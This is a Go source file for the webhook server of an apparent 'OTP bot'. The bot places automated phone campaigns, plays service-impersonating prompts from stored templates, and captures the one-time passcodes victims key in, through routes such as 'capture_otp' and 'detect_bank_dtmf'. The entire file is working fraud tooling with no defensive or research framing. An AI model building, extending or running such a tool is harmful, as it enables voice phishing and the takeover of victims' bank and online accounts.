package bot

import (
	"fmt"
	"log"
	"strconv"

	"github.com/USERNAME/goland-otpbot-api/config"
	"github.com/USERNAME/goland-otpbot-api/db"
	"github.com/USERNAME/goland-otpbot-api/voice"
	"github.com/gofiber/fiber/v2"
)

func (b *Bot) registerWebhooks() {
	cfg, err := config.Get()
	if err != nil {
		log.Printf("Failed to get config for webhooks: %v", err)
		return
	}

	app := fiber.New()

	app.Get("/", func(c *fiber.Ctx) error {
		return c.SendString("OTP Bot Webhooks Active 🤖")
	})

	app.Get("/ring/:campaign/:call/", func(c *fiber.Ctx) error {
		campaignID, err := strconv.ParseInt(c.Params("campaign"), 10, 64)
		if err != nil {
			return c.Status(400).SendString("Invalid campaign ID")
		}
		callID, err := strconv.ParseInt(c.Params("call"), 10, 64)
		if err != nil {
			return c.Status(400).SendString("Invalid call ID")
		}

		b.HandleRing(campaignID, callID)
		if database := db.Get(); database != nil {
			database.CreateLog("INFO", fmt.Sprintf("Ring webhook: campaign=%d, call=%d", campaignID, callID), "")
		}

		return c.SendString(voice.BuildRingXML())
	})

	app.Post("/machine/:campaign/:call/", func(c *fiber.Ctx) error {
		campaignID, err := strconv.ParseInt(c.Params("campaign"), 10, 64)
		if err != nil {
			return c.Status(400).SendString("Invalid campaign ID")
		}
		callID, err := strconv.ParseInt(c.Params("call"), 10, 64)
		if err != nil {
			return c.Status(400).SendString("Invalid call ID")
		}

		b.HandleVoicemail(campaignID, callID)
		if database := db.Get(); database != nil {
			database.CreateLog("INFO", fmt.Sprintf("Machine detection: campaign=%d, call=%d", campaignID, callID), "")
		}

		return c.SendString(voice.BuildMachineXML())
	})

	app.Post("/hangup/:campaign/:call/", func(c *fiber.Ctx) error {
		campaignID, err := strconv.ParseInt(c.Params("campaign"), 10, 64)
		if err != nil {
			return c.Status(400).SendString("Invalid campaign ID")
		}
		callID, err := strconv.ParseInt(c.Params("call"), 10, 64)
		if err != nil {
			return c.Status(400).SendString("Invalid call ID")
		}

		b.HandleHangup(campaignID, callID)
		if database := db.Get(); database != nil {
			database.CreateLog("INFO", fmt.Sprintf("Hangup webhook: campaign=%d, call=%d", campaignID, callID), "")
		}

		return c.SendString("done")
	})

	app.Post("/error/:campaign/:call/", func(c *fiber.Ctx) error {
		campaignID, err := strconv.ParseInt(c.Params("campaign"), 10, 64)
		if err != nil {
			return c.Status(400).SendString("Invalid campaign ID")
		}
		callID, err := strconv.ParseInt(c.Params("call"), 10, 64)
		if err != nil {
			return c.Status(400).SendString("Invalid call ID")
		}
		errorMsg := c.Query("Error", "Unknown error")

		b.HandleError(campaignID, callID, errorMsg)
		if database := db.Get(); database != nil {
			database.CreateLog("ERROR", fmt.Sprintf("Call error: campaign=%d, call=%d, error=%s", campaignID, callID, errorMsg), "")
		}

		return c.SendString("done")
	})

	app.Post("/detect_dtmf/:campaign/:call/", func(c *fiber.Ctx) error {
		campaignID, err := strconv.ParseInt(c.Params("campaign"), 10, 64)
		if err != nil {
			return c.Status(400).SendString("Invalid campaign ID")
		}
		callID, err := strconv.ParseInt(c.Params("call"), 10, 64)
		if err != nil {
			return c.Status(400).SendString("Invalid call ID")
		}
		digits := c.FormValue("Digits")

		if digits == "1" {
			cfg, err := config.Get()
			if err != nil {
				log.Printf("Failed to get config in detect_dtmf: %v", err)
				return c.Status(500).SendString("Configuration error")
			}

			database := db.Get()
			if database == nil {
				log.Printf("Database not initialized")
				return c.Status(500).SendString("Database error")
			}

			campaign, err := database.GetCampaign(campaignID)
			if err != nil {
				log.Printf("Failed to get campaign %d: %v", campaignID, err)
				return c.Status(404).SendString("Campaign not found")
			}

			template, err := database.GetTemplate(campaign.Service)
			if err != nil {
				log.Printf("Failed to get template %s: %v", campaign.Service, err)
				return c.Status(404).SendString("Template not found")
			}

			actionURL := fmt.Sprintf("%s/capture_otp/%d/%d", cfg.NgrokURL, campaignID, callID)

			xml := voice.BuildXMLResponse(
				template.ActionPrompt,
				actionURL,
				template.Confirmation,
				template.HoldMusic,
				template.Voice,
				"en-US",
				3,
			)

			return c.Type("xml").SendString(xml)
		}

		b.HandleHangup(campaignID, callID)
		return c.SendString("done")
	})

	app.Post("/capture_otp/:campaign/:call/", func(c *fiber.Ctx) error {
		campaignID, err := strconv.ParseInt(c.Params("campaign"), 10, 64)
		if err != nil {
			return c.Status(400).SendString("Invalid campaign ID")
		}
		callID, err := strconv.ParseInt(c.Params("call"), 10, 64)
		if err != nil {
			return c.Status(400).SendString("Invalid call ID")
		}
		digits := c.FormValue("Digits")

		if digits != "" {
			b.HandleDTMF(campaignID, callID, digits)
		}

		database := db.Get()
		if database == nil {
			log.Printf("Database not initialized")
			return c.Status(500).SendString("Database error")
		}

		campaign, err := database.GetCampaign(campaignID)
		if err != nil {
			log.Printf("Failed to get campaign %d: %v", campaignID, err)
			return c.Status(404).SendString("Campaign not found")
		}

		template, err := database.GetTemplate(campaign.Service)
		if err != nil {
			log.Printf("Failed to get template %s: %v", campaign.Service, err)
			return c.Status(404).SendString("Template not found")
		}

		xml := voice.BuildDTMFXML(
			template.Confirmation,
			template.HoldMusic,
			template.Voice,
			"en-US",
		)

		return c.Type("xml").SendString(xml)
	})

	app.Post("/detect_bank_dtmf/:campaign/:call/", func(c *fiber.Ctx) error {
		digits := c.FormValue("Digits")

		return c.SendString(fmt.Sprintf("📲 OTP: %s", digits))
	})

	go func() {
		port := cfg.Port
		if port == "" {
			port = "3000"
		}

		log.Printf("Starting webhook server on port %s", port)
		if err := app.Listen(":" + port); err != nil {
			log.Printf("Webhook server error: %v", err)
		}
	}()
}
